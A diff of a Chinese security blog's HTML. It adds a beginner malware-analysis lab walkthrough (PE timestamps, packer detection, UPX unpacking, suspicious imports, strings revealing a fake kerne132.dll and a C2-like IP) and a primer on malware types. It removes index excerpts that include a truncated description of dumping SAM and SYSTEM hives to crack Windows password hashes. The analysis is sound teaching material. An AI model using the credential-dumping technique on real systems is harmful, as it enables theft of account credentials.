-              <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/">恶意代码分析系列</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
+<p>实验一主要的目的是让我们通过实践，学习到PE结构分析工具的使用，还有字符串分析工具和在线病毒查杀网站的使用</p>
+<h3 id="VirSCAN-org"><a href="#VirSCAN-org" class="headerlink" title="VirSCAN.org"></a>VirSCAN.org</h3><p>实验中的题目1是想让我们将文件上传到VirusTotal.com进行查毒，但是这个网站是国外的并且需要翻墙才能访问，所以我们可以用国内的 <a target="_blank" rel="noopener" href="https://www.virscan.org/">VirSCAN.org</a>来代替。</p>
+<p>上传exe后，网站提示文件已经上传过了，那我们直接点查看最后一次的扫描结果即可。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813163953071-1882133889.png" alt="image-20210812163742357"> </p>
+<p>这里可以看到许多杀毒软件报毒了，所以我们可以判定这个文件是属于恶意软件了。</p>
+<p>而像有的杀毒软件却没有报毒，出现这种情况应该是该杀毒软件厂商未能收集到样本的特征码并且加入到他的病毒库中，所以他就无法检测到我们的恶意软件。（dll也是通过同样的方式上传即可，这里不在重复演示）</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813163956660-966476172.png" alt="image-20210812164050189"> </p>
+<h3 id="查看文件编译时间"><a href="#查看文件编译时间" class="headerlink" title="查看文件编译时间"></a>查看文件编译时间</h3><p>PE文件的编译时间呢，存在PE文件头当中，我们平时做逆向或者恶意代码分析，最好要一张PE结构图来进行查阅。</p>
+<p>（仔细看荧光笔的部分，在一个<code>_IMAGE_FILE_HEADER</code>结构体里面就有存放文件编译时间戳的变量<code>TimeDateStamp</code>）</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164016716-1889674843.png" alt="image-20210812164810029"> </p>
+<p>我们可以通过像<code>StudyPE+ x86</code>这类PE结构分析软件来查看文件的编译时间，如下图我们通过查看PE头中的文件时间戳，并且计算出时间即可得到文件的编译时间。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164016860-190726171.png" alt="image-20210812165558881"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164130426-239242223.png" alt="image-20210812165616472"> </p>
+<h3 id="StudyPE-x86-查壳"><a href="#StudyPE-x86-查壳" class="headerlink" title="StudyPE+ x86 查壳"></a>StudyPE+ x86 查壳</h3><p>StudyPE中在文件类型这地方会显示壳的特征，而需要注意的是如果程序<code>没有加壳</code>，那么他会直接显示出<code>开发的语言</code>，当然还有第三种情况就是会显示<code>Unknow Exe Type</code>，意思是他无法识别是什么壳或者什么语言开发的。</p>
+<p>我们可以看到这里他是显示了<code>E Language -&gt; WuTao</code>，什么意思呢？他这里其实是想告诉我们Lab01-01.exe是用易语言进行开发的，其实呢并不是，易语言他底层其实就是调用VC6++进行编译的，所以这个程序他是用VC6++开发的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">易语言</span><br><span class="line">  |  (底层)</span><br><span class="line">  v</span><br><span class="line"> VC6++</span><br></pre></td></tr></table></figure>
 
-  <div class="row mx-auto index-card">
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164020125-81093286.png" alt="image-20210812165946871"> </p>
+<h3 id="导入函数"><a href="#导入函数" class="headerlink" title="导入函数"></a>导入函数</h3><p>Lab01-01.exe中引用了两个动态库，而需要注意的是以下4个API函数。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CreateFileA <span class="comment">//创建文件或打开文件</span></span><br><span class="line">FindNextFileA <span class="comment">//这两个都是用来遍历指定目录所有文件的，特别需要注意因为像勒索软件就需要遍历全盘 对文件进行加密</span></span><br><span class="line">FindFirstFileA</span><br><span class="line">CopyFileA <span class="comment">//拷贝文件，恶意软件往往喜欢将自己拷贝到系统目录。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164023948-554895898.png" alt="image-20210812171041301"> </p>
+<p>在Lab01-01.dll中需要注意的是这三个地方。</p>
+<p>其中<code>KERNEL32.dll</code>中的两个API函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;这两个都是互斥量函数，恶意程序往往喜欢创建或打开一个互斥量，因为创建了互斥量后再同一时间只允许一个程序访问其资源。</span><br><span class="line"></span><br><span class="line">CreateMutex <span class="comment">//创建互斥量</span></span><br><span class="line">OpenMutex   <span class="comment">//打开互斥量</span></span><br></pre></td></tr></table></figure>
+
+<p>而这个<code>WS2_32.dll</code>他是一个网络通讯的动态库，所以我们有理由相信这个恶意程序他会有网络通信的操作。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164028652-578450317.png" alt="image-20210812171918392"> </p>
+<h3 id="Strings查看敏感字符串信息"><a href="#Strings查看敏感字符串信息" class="headerlink" title="Strings查看敏感字符串信息"></a>Strings查看敏感字符串信息</h3><p>Strings是微软官方的一个命令行工具，主要用来查看程序中的所有字符串信息，平时我们通过敏感的字符串来定位分析一个程序是极好的选择。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">命令行：</span><br><span class="line">Strings.exe &quot;Lab01-01.exe&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;值得注意的地方有两处</span><br><span class="line">首先第一处他这里不是kernel32.dll而是kerne132.dll是1234的1，</span><br><span class="line">然后第二处是Lab01-01.dll</span><br><span class="line">&#x2F;&#x2F;再结合我们上面分析的导入表，分析出他有个CopyFile的api函数，所以可以得出结论：</span><br><span class="line">这个exe程序想把Lab01-01.dll文件拷贝到系统目录并且伪装成系统文件&quot;kernel32.dll&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164031792-1111504420.png" alt="image-20210812172847905"> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令行：</span><br><span class="line">Strings.exe &quot;Lab01-01.dll&quot;</span><br><span class="line"></span><br><span class="line">发现有一个ip地址，&quot;127.26.152.13&quot; 并且结合之前dll的导入函数有网络通讯的动态库。</span><br><span class="line">所以最后的结论是：Lab01-01.exe调用Lab01-01.dll对&quot;127.26.152.13&quot;进行连接，此ip可能是黑客用来控制的主控端ip，程序还会将Lab01-01.dll拷贝到系统目录伪装成&quot;kernel32.dll&quot;，以此达到一个持久化的目的。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164034900-2122247722.png" alt="image-20210812173253111"> </p>
+<h2 id="实验二："><a href="#实验二：" class="headerlink" title="实验二："></a>实验二：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab01-02.exe</span><br><span class="line">----------------</span><br><span class="line">使用工具：</span><br><span class="line">1. StudyPE+ x86</span><br><span class="line">2. Strings</span><br><span class="line">3. VirSCAN.org</span><br><span class="line">4. Free UPX</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、将文件上传到http:&#x2F;&#x2F;www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？</span><br><span class="line">2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。</span><br><span class="line">3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？</span><br><span class="line">4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p><code>实验二主要的学习目的是学会用UPX脱壳</code>，我这里就不再演示题目中的常规操作了，请大家务必都完成这些题目，因为动手实践和反复练习才能让你飞速的涨经验升级，(就像刷无聊的小怪)</p>
+<h3 id="UPX-脱壳"><a href="#UPX-脱壳" class="headerlink" title="UPX 脱壳"></a>UPX 脱壳</h3><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164040500-323976483.png" alt="image-20210812174252256"> </p>
+<p>脱壳前：</p>
+<p>这里他显示了我们之前说过的<code>Unknow EXE Type</code>，也就是说他无法识别出程序的类型，这里解决的办法是点击深度搜索。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164041681-1206100825.png" alt="image-20210812174419711"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164044297-855807531.png" alt="image-20210812174545293"> </p>
+<p>脱壳后：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164046240-711895784.png" alt="image-20210812174616454"> </p>
+<h2 id="实验三："><a href="#实验三：" class="headerlink" title="实验三："></a>实验三：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab01-03.exe</span><br><span class="line">----------------</span><br><span class="line">使用工具：</span><br><span class="line">1. StudyPE+ x86</span><br><span class="line">2. Strings</span><br><span class="line">3. VirSCAN.org</span><br><span class="line">4. linxerUnpack</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、将文件上传到http:&#x2F;&#x2F;www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？</span><br><span class="line">2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。</span><br><span class="line">3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？</span><br><span class="line">4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p><code>实验三的主要学习目的是学会用linxerUnpack进行通用脱壳</code>，还是希望大家将题目都做完，这里就不演示了。</p>
+<h3 id="通用脱壳机"><a href="#通用脱壳机" class="headerlink" title="通用脱壳机"></a>通用脱壳机</h3><p>查壳：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164049720-956519126.png" alt="image-20210812174843358"> </p>
+<p>脱壳：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164052664-407245817.png" alt="image-20210812174944742"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164053166-1137615638.png" alt="image-20210812175011801"> </p>
+<h2 id="实验四："><a href="#实验四：" class="headerlink" title="实验四："></a>实验四：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab01-04.exe</span><br><span class="line">----------------</span><br><span class="line">使用工具：</span><br><span class="line">1. StudyPE+ x86</span><br><span class="line">2. Strings</span><br><span class="line">3. VirSCAN.org</span><br><span class="line">4. Restorator</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、将文件上传到http:&#x2F;&#x2F;www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？</span><br><span class="line">2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。</span><br><span class="line">3、这个文件是什么时候被编译的？</span><br><span class="line">4、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？</span><br><span class="line">5、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？</span><br><span class="line">6、这个文件在资源段中包含一个资源，使用Restorator工具来检查资源，然后抽取资源。从资源中你能发现什么吗？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p><code>实验四的主要学习目的是学会用资源管理器，查看资源</code>，还是希望大家手动将1-6到题目亲手做一遍。</p>
+<h3 id="资源查看器"><a href="#资源查看器" class="headerlink" title="资源查看器"></a>资源查看器</h3><p>在Lab01-04中有个”BIN”的资源，并且文件头是以<code>MZ</code>开头，可以确定他是一个PE文件，我们用右键功能将其导出。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164056184-1521474947.png" alt="image-20210812175358975"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164057602-1335390299.png" alt="image-20210812175545330"> </p>
+<p>导出后发现是一个EXE程序，并且没有加壳。</p>
+<p>接着我们继续来看看他的导入表，发现他有两个比较可疑的api函数</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164115343-2037423307.png" alt="image-20210812175610925"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164058954-919815121.png" alt="image-20210812175739276"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164102403-1446640878.png" alt="image-20210812175805636"> </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinExec <span class="comment">//这个api主要是用来进行执行程序、命令操作。</span></span><br><span class="line">URLDwonloadToFile <span class="comment">//这个api是从网络上下载文件并保存到本地的一个操作。</span></span><br><span class="line">    </span><br><span class="line">所以请大家自行去完成他会下载一个什么程序 并且执行呢？</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="最后总结："><a href="#最后总结：" class="headerlink" title="最后总结："></a>最后总结：</h2><p>我们分别学习了以下软件或网站</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://www.virscan.org/">www.virscan.org</a> (查杀恶意软件在线网站)</p>
+</li>
+<li><p>StudyPE+ x86       (查壳、查看文件编译时间、查看导入表)</p>
+</li>
+<li><p>Strings.exe            (分析程序中的字符串)</p>
+</li>
+<li><p>Free UPX                (脱UPX壳)</p>
+</li>
+<li><p>linxerUnpacker  (脱通用的壳)</p>
+</li>
+</ul>
+<p>欢迎加入QQ群：研究逆向、PWN、WEB安全、物联网安全</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816153655993-993042562.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>
+
+      
+    </div>
+
     
     
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/08/MalwareAnalysis/1.Basic/" target="_self">
-          恶意代码分析实战一：专业术语入门知识
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/08/08/MalwareAnalysis/1.Basic/" target="_self">
-          
-          
-            
-          
-          
-
-什么是恶意代码分析？恶意代码也称为恶意软件:    任何以某种方式对用户、计算机或网络造成破坏的软件，包括计算机病毒、木马、蠕虫、内核套件、勒索软件、间谍软件，等等。
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
   
-恶意代码的类型：恶意代码类型种类非常多，这里只列出比较常见的8中类型。
- 
+  
+  
 
-后门：病毒在电脑里面潜伏，开一个门方便黑客连进来进行操作。
-僵尸网络：CC攻击，DDOS工具，利用大批量肉鸡 发送指令对指定IP攻击。
-下载器：
-        </a>
-      </p>
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/08/08/MalwareAnalysis/1.Basic/">
 
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-08 17:58" pubdate>
-              2021-08-08
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/PC%E9%80%86%E5%90%91/">PC逆向</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/">恶意代码分析系列</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/05/IoTSecurity/IoT-vulhub/" target="_self">
-          路由器漏洞环境仿真
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/08/05/IoTSecurity/IoT-vulhub/" target="_self">
-          
-          
-            
-          
-          
-
-0x00 前言最近在研究路由器漏洞，要是每次分析个路由器都要上闲鱼买一个路由器真的费用有点高，所以在网上找了类似的路由器漏洞环境仿真的平台，运气不错在GitHub上找到一个开源项目IoT-vulhub，接下来就是记录自己搭建IoT固件漏洞复现环境的过程。  
-0x01 IoT-vulhub安装系统环境：123456789101112131415161718192021.............
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-05 10:05" pubdate>
-              2021-08-05
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/">物联网安全</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BB%BF%E7%9C%9F/">路由器仿真</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/06/02/WebSecurity/ThinkPHPAndSunHack/" target="_self">
-          渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/06/02/WebSecurity/ThinkPHPAndSunHack/" target="_self">
-          
-          
-            
-          
-          
-
-0x00 前言
-任何渗透测试技术支持服务，都应该先拿到授权书后方可进行。
-
-0x01 信息收集http://www.xxxx.cn/login
-1234567FrontFrame: Twitter Bootstrap,jQuery Sparklines,OWL Carousel,Font Awesome,JQuery:1.8.3,HTML5Widget: Access-ControlLangu
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-06-02 19:21" pubdate>
-              2021-06-02
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/ThinkPHP%E6%BC%8F%E6%B4%9E/">ThinkPHP漏洞</a>
-            
-              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2020/11/13/Forensics/mimikatz/" target="_self">
-          Mimikatz离线破解Windows登陆密码
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2020/11/13/Forensics/mimikatz/" target="_self">
-          
-          
-            
-          
-          
-
-
-使用场景已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧
-利用方式首先导出两个文件，可能需要管理员权限 ，CMD或者Powershell运行都可以。
-12reg sa
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2020-11-13 11:50" pubdate>
-              2020-11-13
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/Forensics/">电子取证</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Windows%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">Windows密码破解</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-
-
-  <nav aria-label="navigation">
-    <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#board">3</a><a class="extend next" rel="next" href="/page/3/#board"><i class="iconfont icon-arrowright"></i></a>
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
     </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/08/MalwareAnalysis/1.Basic/" class="post-title-link" itemprop="url">恶意代码分析实战一：专业术语入门知识</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-08 17:58:30" itemprop="dateCreated datePublished" datetime="2021-08-08T17:58:30+08:00">2021-08-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-16 19:03:23" itemprop="dateModified" datetime="2021-08-16T19:03:23+08:00">2021-08-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PC%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">PC逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <meta name="referrer" content="no-referrer"/>
+
+<h2 id="什么是恶意代码分析？"><a href="#什么是恶意代码分析？" class="headerlink" title="什么是恶意代码分析？"></a>什么是恶意代码分析？</h2><p>恶意代码也称为恶意软件:    任何以某种方式对用户、计算机或网络造成破坏的软件，包括计算机病毒、木马、蠕虫、内核套件、勒索软件、间谍软件，等等。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152408070-146731502.png" alt="image-20210812161145164">  </p>
+<h2 id="恶意代码的类型："><a href="#恶意代码的类型：" class="headerlink" title="恶意代码的类型："></a>恶意代码的类型：</h2><p>恶意代码类型种类非常多，这里只列出比较常见的8中类型。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152426134-1255295289.png" alt="image-20210812161210295"> </p>
+<ul>
+<li>后门：病毒在电脑里面潜伏，开一个门方便黑客连进来进行操作。</li>
+<li>僵尸网络：CC攻击，DDOS工具，利用大批量肉鸡 发送指令对指定IP攻击。</li>
+<li>下载器：下载程序，去网络上下载组件或程序到本地。</li>
+<li>间谍软件：偷用户信息，比如键盘记录器，偷密码。</li>
+<li>启动器： （也称为加载器）是一类可执行文件，用来安装立即运行或者将来秘密执行的恶意代码，启动器通常包含一个它要加载的恶意代码。</li>
+<li>内核套件：RootKit，权限相对高，不容易被发现，Ring0层。</li>
+<li>勒索软件：全盘加密文件，非对称加密/对称加密。</li>
+<li>蠕虫：带感染功能，感染exe。 黑客帝国里面的特工史密斯</li>
+</ul>
+<p>欢迎加入QQ群：研究逆向、PWN、WEB安全、物联网安全</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816153615446-1312770443.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
